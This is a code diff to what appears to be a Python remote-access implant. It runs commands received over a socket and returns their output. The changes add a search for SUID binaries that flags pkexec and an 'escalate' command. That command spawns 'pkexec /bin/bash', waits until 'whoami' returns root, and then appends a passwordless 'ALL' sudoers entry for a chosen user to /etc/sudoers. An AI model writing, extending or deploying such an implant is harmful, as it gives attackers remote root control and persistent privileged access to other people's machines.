@@ -36,7 +36,8 @@ def find_suid_binaries():
     return suid_files
 
 def shell():
-    process = None
+    esc_process = None
+    
     while True:
         try:
             command = reliable_recv()
@@ -47,20 +48,51 @@ def shell():
                 reliable_send("test...")
 
             elif command.lower() == 'findsuid':
-                reliable_send(find_suid_binaries())                        
 
-            elif command.endswith("/bin/bash"):
-                pkexec_command = command.strip()
-                process = subprocess.Popen(pkexec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                suid_files = []
+                suid_files = find_suid_binaries()
+                result =    f"This is all suid binaries => \n {suid_files}"
+                if "/usr/bin/pkexec" in suid_files:
+                    result = "Found pkexec!!!!!!\nYou can run ESCALATE\n================\n" + result
+
+                reliable_send(result)                        
+
+            elif command.startswith("escalate"):
+                pkexec_command = "pkexec /bin/bash"
+                esc_process = subprocess.Popen(pkexec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 # Start threads to read stdout and stderr
-                threading.Thread(target=read_stream, args=(process.stdout,)).start()
-                threading.Thread(target=read_stream, args=(process.stderr,)).start()
+                threading.Thread(target=read_stream, args=(esc_process.stdout,)).start()
+                threading.Thread(target=read_stream, args=(esc_process.stderr,)).start()
                 reliable_send("Privilege escalation to root shell started.")
-            elif process:
-                # Send command to the pkexec process
-                process.stdin.write(command.encode() + b'\n')
-                process.stdin.flush()
-                threading.Thread(target=check_non_output_command, args=(process,command)).start()
+
+                while True:
+                    reliable_send("Waiting user input PASS")
+                    time.sleep(1)
+                    esc_process.stdin.write("whoami".encode() + b'\n')
+                    esc_process.stdin.flush()
+                    try:
+                        if read_stream_result == "root":
+                            reliable_send("DONE")
+                            break
+                    except:
+                        print("--> error")
+                        continue
+                    
+                
+                if esc_process:
+                    # Send command to the pkexec esc_process
+                    user = command[9:]
+                    esc_command = f'echo "{user} ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers_entry\ncat /tmp/sudoers_entry >> /etc/sudoers'
+                    esc_process.stdin.write(esc_command.encode() + b'\n')
+                    esc_process.stdin.flush()   
+                    
+                    #send the result of sudo -l
+                    execute = subprocess.Popen("sudo -l", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    result = execute.stdout.read() + execute.stderr.read()
+                    result = result.decode()
+                    reliable_send(result)
+
+                    # threading.Thread(target=check_non_output_command, args=(esc_process,command)).start()
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 result = execute.stdout.read() + execute.stderr.read()
@@ -70,13 +102,17 @@ def shell():
             reliable_send(str(e))
 
 def read_stream(stream):
+    global read_stream_result
     for line in iter(stream.readline, b''):
-        reliable_send(line.decode())
+        decoded_line = line.decode().strip()
+        if decoded_line == "root":
+            read_stream_result = decoded_line
     stream.close()
 
-def check_non_output_command(process,command):
+
+def check_non_output_command(esc_process,command):
     time.sleep(2)
-    if process.poll() is None:
+    if esc_process.poll() is None:
         reliable_send(f"Command {command} executed with no output.")
 
 def connect():
@@ -89,9 +125,10 @@ def connect():
             s.close()
             break
         except Exception as e:
-            print(e)
+            print(str(e))
             connect()
 
 if __name__ == "__main__":
+    read_stream_result = "-"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect()
